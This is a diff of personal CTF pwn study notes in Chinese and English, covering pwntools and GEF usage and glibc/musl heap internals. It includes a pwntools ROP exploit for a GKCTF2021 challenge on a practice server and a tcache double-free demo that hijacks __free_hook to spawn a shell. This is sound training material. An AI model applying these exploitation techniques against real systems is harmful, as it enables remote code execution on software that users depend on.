@@ -88,9 +88,9 @@ one_gadget('/lib/x86_64-linux-gnu/libc.so.6')
 - `GEF` (pronounced ʤɛf - "Jeff") is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis and exploit development.
 - Installation:
   1. 访问 http://gef.blah.cat/py  ，将其内容保存到文件`~/.gdbinit-gef.py`中
-  2. `echo source ~/.gdbinit-gef.py >> ~/.gdbinit`. 
+  2. `echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit`. 
 
-- 使用gef:  `echo "source ~/.GdbPlugins/gef/gef.py" > ~/.gdbinit`, 然后`~/.gdbinit`内容如下，gdb启动后为使用gef，显示`gef➤ `
+- 使用gef:  `echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit`, 然后`~/.gdbinit`内容如下，gdb启动后为使用gef，显示`gef➤ `
 
 ```bash
 source /home/kali/.gdbinit-gef.py
@@ -206,29 +206,7 @@ python3 -m pip install --upgrade pwntools
 
 
 
-
-
-### Connections
-
-
-
-```python
-# There’s even an SSH module for when you’ve got to SSH into a box to perform a local/setuid exploit with pwnlib.tubes.ssh. You can quickly spawn processes and grab the output, or spawn a process and interact with it like a process tube. # ssh连接
-shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
-shell['whoami'] # b'bandit0'
-shell.download_file('/etc/motd')
-sh = shell.run('sh')
-sh.sendline(b'sleep 3; echo hello world;') 
-sh.recvline(timeout=1) # b''
-sh.recvline(timeout=5) # b'hello world\n'
-shell.close()
-```
-
-
-
-
-
-### Target Architecture, OS, Logging, Assembly
+### Target Architecture, OS, Logging, Assembly, ELF
 
 ```python
 asm('nop') # b'\x90'
@@ -267,10 +245,6 @@ print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
 
 
 
-
-
-### ELF Manipulation
-
 ```python
 e = ELF('/bin/cat')
 print(hex(e.address)) #doctest: +SKIP # 0x400000
@@ -297,15 +271,15 @@ disasm(open('/tmp/quiet-cat','rb').read(1))
 from pwn import *   # ROP_double_leave_tiny_rop_GKCTF2021_checkin # truncated
 
 context.log_level = "DEBUG"
-context.binary = './login'
-# process(['ld', 'pwn'], env={'LD_PRELOAD':'libc'})
-# sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
-# process(['ld.so','pwn'],env=xxx)
+context.binary = "./pwn"
+# sh = process(["ld.so", "pwn"], env={"LD_PRELOAD":"libc.so"})
+# sh = process("./pwn", env={"LD_PRELOAD": "./libc.so.6"})
+# sh = process(["ld.so", "pwn"],env=xxx)
 sh = remote("node3.buuoj.cn", 27490)
 libc = ELF("./libc.so.6")
-elf = ELF("./login")
+elf = ELF("./pwn")
 gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")
-
+#gdb.attach(sh, "b *$rebase(0x0000000000000F43)")
 payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
 sh.sendafter(">", payload)
 
@@ -318,6 +292,17 @@ payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247) # one_gadg
 sh.sendafter(">", payload)
 
 sh.interactive()
+```
+
+
+
+### Docker
+
+> https://blog.csdn.net/Huangshanyoumu/article/details/115037413 docker安装+换源
+
+```bash
+sudo docker pull pwntools/pwntools:stable # Download the Docker image
+sudo docker run -it pwntools/pwntools:stable # Boot the image
 ```
 
 
@@ -366,7 +351,7 @@ ROPgadget --binary ret2baby  --string "/bin/sh" # 获得 /bin/sh 字符串对应
 
 # Anti-Pwn
 
-
+反调试：alarm 程序超时抛出SIGALRM退出。会影响本地调试，替换成isnan函数：`sed -i s/alarm/isnan/g ./ProgrammName`
 
 
 
@@ -1085,9 +1070,10 @@ strings libc.so.6 | grep GLIBC # 最后一行显示glibc的具体版本
 > It doesn't work. why? libc6_2.27-3ubuntu1_i386.deb work, why? how it works?
 
 3. 提取 deb 里面的文件到文件夹 extr: `sudo dpkg -X libc6_2.27-3ubuntu1_amd64.deb ./extr`
-4. 找到 `ld-2.27.so`: `find ./extr -name "ld*"      # Output: ./extr/lib/x86_64-linux-gnu/ld-2.27.so`
-5. 把ld-2.27.so复制到当前目录命名为ld.so: `cp ./extr/lib/x86_64-linux-gnu/ld-2.27.so ./ld.so`
-6. 尝试在bash指定libc.so ld.so运行程序
+4. `file ./extr/lib/i386-linux-gnu/libc-2.19.so` 查看sha1, 与给出的libc的sha1对比
+5. 找到 `ld-2.27.so`: `find ./extr -name "ld*"      # Output: ./extr/lib/x86_64-linux-gnu/ld-2.27.so`
+6. 把ld-2.27.so复制到当前目录命名为ld.so: `cp ./extr/lib/x86_64-linux-gnu/ld-2.27.so ./ld.so`
+7. 尝试在bash指定libc.so ld.so运行程序
 
 ```bash
 LD_PRELOAD=./libc.so.6 ./ld.so ./ciscn_final_3 # LD_PRELOAD=./libc.so ./ld.so ./elf
@@ -1382,6 +1368,10 @@ readelf -S ret2libc # 可以获得段地址，比如bbs段的地址 # 也可在I
 ### ret2csu
 
 
+
+> # Cases
+>
+> - ciscn_2019_s_3: 全国大学生信息安全竞赛 线下半决赛。https://blog.csdn.net/github_36788573/article/details/103541178
 
 
 
@@ -2190,10 +2180,6 @@ cases:
 
 
 
-### fmt str on Heap
-
-
-
 
 
 
@@ -2378,6 +2364,8 @@ int main(){
 
 #### chunk
 
+> chunk在内存中存储的形式可以看 `tcache_attack_unsorted_bins_leak_libc_CISCN_2019_final_3` 案例中的分析
+
 - **chunk**: 称由 malloc 申请的内存为 chunk。malloc_chunk
 - **malloc_chunk**: 无论大小，分配 / 释放状态，chunk都使用一个结构体 malloc_chunk 来表示。但根据是否被释放，malloc_chunk 表现形式有不同。
 
@@ -2414,8 +2402,8 @@ struct chunk{ // chunk释放后的结构
 
 ```cpp
 // chunk在内存中的布局 // 一个接一个按序存放
-| in used | 0x21   |
-|   fd    |   bk   |
+| in used | 0x21   |  // 
+|   fd    |   bk   |  // 因为size域以1结尾，所以这里fd, bk域实际上是user data，并不是fd bk指针
 |  0x20   |  0xa0  |  // 0xa0 0结尾表示未使用，则0x20处有效，指前一个chunk大小为0x20
 |      in used     |
 |      in used     |
@@ -2706,9 +2694,13 @@ typedef struct malloc_chunk *mbinptr;
 
 ### Tcache & Tcache Attack
 
-> Thread Cache?
+> Thread Cache Bin        libc 2.26引入  提升堆管理性能
+>
+> https://blog.csdn.net/weixin_43960998/article/details/113831900  glibc 新增保护机制
+>
+> https://4f-kira.github.io/2020/03/04/glibc2-29-tcache/ glibc 2.29 tcache保护机制
 
-glibc 2.26(ubuntu 17.10)之后引入的技术，用于缓存各个线程释放的内存，用于加速多线程下内存申请。每个线程都有自己的Tcache，因此从tcache中malloc内存时不需要加锁。但欠缺安全检查。
+glibc **2.26** (ubuntu 17.10)之后引入的技术，用于缓存各个线程释放的内存，用于加速多线程下内存申请。每个线程都有自己的Tcache，因此从tcache中malloc内存时不需要加锁。但欠缺安全检查。
 
 - 使用简单单链表管理free后的chunk，相同大小的放同一条链上。next指针指向下一个大小相同的chunk的user data(fd指针)
 - 用一个数组存储各链表头，另一个数组存储链表长度
@@ -2716,44 +2708,53 @@ glibc 2.26(ubuntu 17.10)之后引入的技术，用于缓存各个线程释放�
 
 ```cpp
 # define TCACHE_MAX_BINS  64
-typedef struct tcache_perthread_struct{
-  char counts[TCACHE_MAX_BINS]; // 链表长度数组(0~7)  // 各链chunk size=0x21, 0x31...
-  tcache_entry *entries[TCACHE_MAX_BINS]; // 链表头指针数组
+typedef struct tcache_perthread_struct { // 每个线程一个
+  char counts[TCACHE_MAX_BINS]; // 链表长度数组(0~7) 64 // 各链chunk size=0x21, 0x31...
+  tcache_entry *entries[TCACHE_MAX_BINS]; // 链表头指针数组 64
 } tcache_perthread_struct;
 static __thread tcache_perthread_struct *tcache = NULL;
+
+typedef struct tcache_entry { // libc 2.29的 tcache_entry 结构体
+  struct tcache_entry *next; // fw filed
+  struct tcache_perthread_struct *key; // bk filed // This field exists to detect double frees.
+} tcache_entry;
 ```
 
 ![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/tcache.png)
 
-tcache攻击作用：
 
-- 任意内存读写
-- RCE
-  - 利用任意内存读写修改函数指针，free_hook, malloc_hook, got表
 
-malloc / free procedure:
+**malloc / free procedure**
 
-- [malloc](https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L3585): 第一次malloc时先malloc一块内存存放`tcache_perthread_struct`。size在tcache范围内时找对应链表：
+- [malloc](https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L3585): 第一次malloc时命中 **MAYBE_INIT_TCACHE**, malloc一块内存存放`tcache_perthread_struct` 。size在tcache范围内时在tcache中找：
   1. tcache有合适的：直接从链表拿出一个chunk返回
   2. tcache为空：从bin找。(最终可能调 `_int_malloc`分配
-- [free](https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L4173):
+- [free](https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L4173): 在`static void _int_free`中的`#if USE_TCACHE`有详细阐释
   1. 找大小对应的链表，检查链表节点数
   2. 该链没被填满(default: 7)：将chunk放进去
   3. 该链被填满(size=7)：将chunk放到fastbin或unsorted bin
 
-**安全检查**
+**Security Check**
 
-- 从 tcache 拿 chunk: malloc
+- malloc: 从 tcache 拿 chunk
   1. ...
-- 往 tcache 放 chunk: free
-  1. 检查当前chunk是否与头节点为同一个chunk(防止连续double free)
-  2. chunk入链时会计算一个magic num并与bk域对比，如果相同，遍历整个链表检查是否存在double free，然后将magic num存在bk域。(高版本)
+- free: 往 tcache 放 chunk
+  1. `tcache_entry`在next域后新增key域(在bk域)，检查是否为`tcache_perthread_struct`地址，然后遍历tcache检查该chunk是否在tcache中，有则触发 `double free detected in tcache 2` ([libc2.29新增](https://elixir.bootlin.com/glibc/glibc-2.29.9000/source/malloc/malloc.c#L4209))
+  2. 检查当前chunk是否与头节点为同一个chunk(防止连续double free)
+
+**Security Bypass**
+
+绕过对e->key / bk 域的检查：
+
+1. UAF或堆溢出，修改e->key为空
+
+
 
 
 
 #### Tcache Poisoning: UAF
 
-> https://blog.csdn.net/qq_41202237/article/details/113400567
+> https://blog.csdn.net/qq_41202237/article/details/113400567  tcache基础与tcache poisoning 图有误 以本note为准
 
 通过UAF, ... 修改链表中的fd指针(即chunk data首地址)
 
@@ -2791,17 +2792,16 @@ e -> fd1 // malloc: 1. 拿出头指针 e 指向的 fd1_ 2. e指向下一个chunk
 
 ```cpp
 int main(){ // gcc a.cpp -o a -fpermissive       -Wno-conversion-null -w
-    long long * p1;
-    p1 = malloc(0x50);
-    free(p1);
-    free(p1);
-    free(p1);
-    p1 = malloc(0x50);
-    p1[0] = &__free_hook;
-    p1 = malloc(0x50);
-    p1 = malloc(0x50);
-    p1[0] = (long long)&system;
-    free("/bin/sh");
+    long long * p1 = malloc(0x50);
+    free(p1);             // tcache(0x61).e -> p1
+    free(p1);             // tcache(0x61).e -> p1 -> p1
+    free(p1);             // tcache(0x61).e -> p1 -> p1 -> p1
+    p1 = malloc(0x50);    // tcache(0x61).e -> p1 -> p1
+    p1[0] = &__free_hook; // tcache(0x61).e -> p1 -> __free_hook
+    p1 = malloc(0x50);    // tcache(0x61).e -> __free_hook
+    p1 = malloc(0x50);    // p1 = __free_hook
+    p1[0] = (long long)&system; // *__free_hook = system
+    free("/bin/sh");      // system("/bin/sh")
 }
 ```
 
@@ -2826,13 +2826,13 @@ int main(){ // gcc a.cpp -o a -fpermissive       -Wno-conversion-null -w
 
 
 
-malloc / free procedure:
+**malloc / free procedure**
 
 - malloc: 如果tcache中没有chunk，则到fastbin找
 - free: tcache满了时，则会把小chunk放入fastbin
 - calloc: 不经过tcache，直接从fastbin拿chunk
 
-**安全检查**
+**Security Check**
 
 - 从 fast bin 的链拿chunk: malloc
   1. 检查chunk的size是否正确
@@ -2891,7 +2891,7 @@ int main() {
 - Chunk size: unsorted bin对chunk的大小没有限制，任何大小的chunk都可以归属到unsorted bin中
 - FIFO，插入时插入到unsorted bin头部，取出时从链表尾取
 
-malloc / free procedure:
+**malloc / free procedure:**
 
 - malloc: 在tcache, fast bin, small bin找不到大小合适的chunk，则到unsorted bin找
   1. 找到：用unsorted bin中大小合适的chunk尽可能地填满tcache。然后再返回结果
@@ -2913,18 +2913,27 @@ malloc / free procedure:
 
 
 
-
-
-**安全检查**
+**Security Check**
 
 - 从 unsorted bin 的链拿chunk: malloc
   1. .
 - 向 unsorted bin 的链放 chunk: free
-  1. 检查下一个chunk的size域是否合法，可能还检查下下个size域是否合法(大于等于0x21)
+  1. 检查下一个chunk的`size`是否大于0x20(2.29)，可能还检查下下个size域是否合法(大于等于0x21)
+  2. 检查下一个chunk的`prev_size`
+  3. 检查unsorted bin链表完整性
+  4. 检查下一个chunk的`prev_inuse`位
 
 
 
-#### Unsorted Bin: Leak
+#### Unsorted Bin: Leak libc
+
+往unsorted bin链入一个chunk时，该chunk的fw bk都会指向libc上的一个地址，这个地址与libc的基址的offset是不变的，如果可以得到这个地址，那么减去offset就是libc基址，达到泄露libc基址的目的
+
+
+
+> **Cases**
+>
+> - CISCN_2019_final_3: 构造fake chunk，既放入tcache也放入unsorted bin，然后从tcache中取出得到libc基址，double free改`__free_hook`
 
 
 
@@ -2961,15 +2970,85 @@ Trigger Conditions:
 
 
 
+
+
+### House Of Einherjar
+
+> 
+
+
+
+
+
+
+
+
+
+## Heap Exploitation: musl-libc
+
+> http://git.etalabs.net/cgit/musl/ musl官网
+>
+> https://juejin.cn/post/6844903574154002445 从一次 CTF 出题谈 musl libc 堆漏洞利用
+
+musl libc: 专为嵌入式系统开发的轻量级libc库，简单、轻量、高效
+
+musl libc约等于dlmalloc(glibc堆管理器ptmalloc2前身)，故chunk unbin等与glibc十分相似
+
+bin由64个结构类似small bin的双向循环链表组成，使用bitmap记录每个链表是否为空，从链表首部取出chunk，尾部插入chunk。每个bin容纳的chunk大小不同，至多容纳1024种不同大小的chunk
+
+
+
+```cpp
+struct chunk {
+    size_t psize, csize; // 相当于 glibc 的 prev size 和 size
+    struct chunk *next, *prev;
+};
+```
+
+- chunk 之间不重用`psize`字段
+
+`psize`和`csize`字段都有标志位（glibc 只有`size`字段有），但只有一种位于最低位的标志位`INUSE`（glibc 最低三位都有标志位）。若设置`INUSE`标志位（最低位为1），表示 chunk 正在被使用；若没有设置`INUSE`标志位（最低位为0），表示 chunk 已经被释放或者通过`mmap`分配的，需要通过`psize`的标志位来进一步判断 chunk 的状态
+
+```cpp
+static struct {
+    volatile uint64_t binmap;
+    struct bin bins[64];
+    volatile int free_lock[2];
+} mal; // mal结构体类似于 glibc 中的arena
+struct bin { // 用循环链表来记录
+    volatile int lock[2];
+    struct chunk *head; // point to head chunk
+    struct chunk *tail; // point to tail chunk
+};
+```
+
+| bin index | chunk size count | chunk size range  | 下标 i 与 chunk 大小范围的关系                        |
+| --------- | ---------------- | ----------------- | ----------------------------------------------------- |
+| 0-31      | 1                | 0x20 – 0x400      | (i+1) * 0x20                                          |
+| 32-35     | 8                | 0x420 – 0x800     | (0x420+(i-32) \*0x100) ~ (0x500+(i-32)\* 0x100)       |
+| 36-39     | 16               | 0x820 – 0x1000    | (0x820+(i-36) \*0x200) ~ (0x1000+(i-36)\* 0x200)      |
+| 40-43     | 32               | 0x1020 – 0x2000   | (0x1020+(i-40) \*0x400) ~ (0x1400+(i-40)\* 0x400)     |
+| 44-47     | 64               | 0x2020 – 0x4000   | (0x2020+(i-44) \*0x800) ~ (0x2800+(i-44)\* 0x800)     |
+| 48-51     | 128              | 0x4020 – 0x8000   | (0x4020+(i-48) \*0x1000) ~ (0x5000+(i-48)\* 0x1000)   |
+| 52-55     | 256              | 0x8020 – 0x10000  | (0x8020+(i-52) \*0x2000) ~ (0xa000+(i-52)\* 0x2000)   |
+| 56-59     | 512              | 0x10020 – 0x20000 | (0x10020+(i-56) \*0x4000) ~ (0x14000+(i-56)\* 0x4000) |
+| 60-62     | 1024             | 0x20020 – 0x38000 | (0x20020+(i-60) \*0x8000) ~ (0x28000+(i-60)\* 0x8000) |
+| 63        | unlimited        | 0x38000 above     | 0x38000 <                                             |
+
+
+
+
+
+
 ## **IO\_FILE** Utilization
 
-
+> https://xz.aliyun.com/t/5579#toc-1
 
 ## Race Condition
 
 > 条件竞争
 
-## 整数溢出
+## Interger Overflow整数溢出
 
 
 
